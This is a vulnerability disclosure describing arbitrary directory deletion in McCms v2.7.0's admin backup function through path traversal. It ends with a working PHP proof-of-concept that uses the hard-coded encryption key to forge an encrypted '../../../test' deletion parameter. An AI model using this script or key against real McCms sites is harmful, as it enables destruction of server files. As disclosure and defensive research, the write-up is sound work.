# Arbitrary file deletion vulnerability
##### Vulnerability Location: /sys/apps/controllers/admin/Backups.php
##### Affected Range: McCms v2.7.0
##### Vulnerability Cause: Backups.php contains a serious security vulnerability that allow attackers to delete any file.
##### Vulnerability Impact: The application or operating system is not running properly
##### Link: https://www.mccms.cn/
# Vulnerability recurrence

After logging in, at the system backup function point, first back up a file, as shown in Mccms-20250522 below. You can see that there is an operation to delete the backup file below:

<img width="1427" alt="image" src="https://github.com/user-attachments/assets/42257348-7133-49bc-ab6b-1eed76654512" />

Attempt to delete Mccms-20250522 and capture the corresponding data packets:

<img width="1432" alt="image" src="https://github.com/user-attachments/assets/37ed9a8f-b146-4349-a6f7-4099f5c4e750" />

The url address in the data packet is backups/restore_del, and thus it is located in the source code:

<img width="669" alt="image" src="https://github.com/user-attachments/assets/608ca445-f183-4755-a277-8cd94aa85426" />

The encryption key is hard-coded in the source code, allowing users to generate new parameter values based on the encryption key and the corresponding encryption code. Here, a "test" folder is created in the same directory as the source code to regenerate the parameter values:

<img width="1370" alt="image" src="https://github.com/user-attachments/assets/9593e0ea-3878-46b0-bec9-f7fcf0db974d" />

The data packet was replayed and a prompt indicating successful deletion was found：

<img width="1444" alt="image" src="https://github.com/user-attachments/assets/19994324-ea7d-4756-9328-2244b9e8beaf" />

Then I searched to see if the "test" directory existed and found that it had been deleted：

<img width="830" alt="image" src="https://github.com/user-attachments/assets/a25ac176-a876-4c18-a36f-fa9c6e8bbea3" />

It can be found that the "test" folder does not exist under the directory "D:\phpstudy_pro\WWW"

# Code Analysis

<img width="625" alt="image" src="https://github.com/user-attachments/assets/d51ed118-fdeb-4c0c-b30c-6cd41dedc08d" />

The passed dir is an array. Traverse this array, then decrypt it, and call the sys_auth method! Determine whether the decrypted dir has a value, and then call the delete_files function to delete the files under the directory! Follow up in the sys_auth method:

<img width="1084" alt="image" src="https://github.com/user-attachments/assets/b64f1427-811b-4ff9-aac7-4798e39d0ef3" />

When the sys_auth method is called, the key variable is not passed. Therefore, the key variable here is the constant value of Mc_Encryption_Key! View this value:

<img width="776" alt="image" src="https://github.com/user-attachments/assets/59aed29c-f8db-4118-97b8-315013b1bb5a" />

The encrypted key is hard-coded in the source code, so malicious parameter values can be generated based on this value!

Next, follow up to the delete_files method to see how to delete the files:

<img width="1512" alt="image" src="https://github.com/user-attachments/assets/48a69f00-9518-44ef-bef2-d9c642f94639" />

It can be seen that the first step is to determine whether the variable dir can be opened, that is, to check if it is a directory. If not, it directly returns FALSE! Deleting the file was unsuccessful! But the folder can be deleted! This has led to the deletion of any file!

Re-encrypt and decrypt the script:

```
<?php
define('Mc_Encryption_Key','9LneByFjWQUYozg');
function sys_auth($string, $type = 0, $key = '', $expiry = 0) {
    
    if(is_array($string)) $string = json_encode($string);
	if($type == 1) $string = str_replace('-','+',$string);
	$ckey_length = 4;
	$key = md5($key ? $key : Mc_Encryption_Key);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);
	$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);
	$result = '';
	$box = range(0, 255);
	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}
	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	} 
	if($type == 1) {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			$result = substr($result, 26);
			$json = json_decode($result,1);
			if(!is_numeric($result) && $json){
				return $json;
			}else{
				return $result;
			}
		}
		return '';
	}
	return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));
}


$String = "../../../test";
$type = 0;

if($type==0){
	$encryptedString = sys_auth($String, $type);
	echo "加密结果: ";
	print_r($encryptedString);
}else{
	$decryptedData = sys_auth($String, $type);
	echo "解密结果: ";
    print_r($decryptedData); // 如果是数组会自动解析
}

?>
```
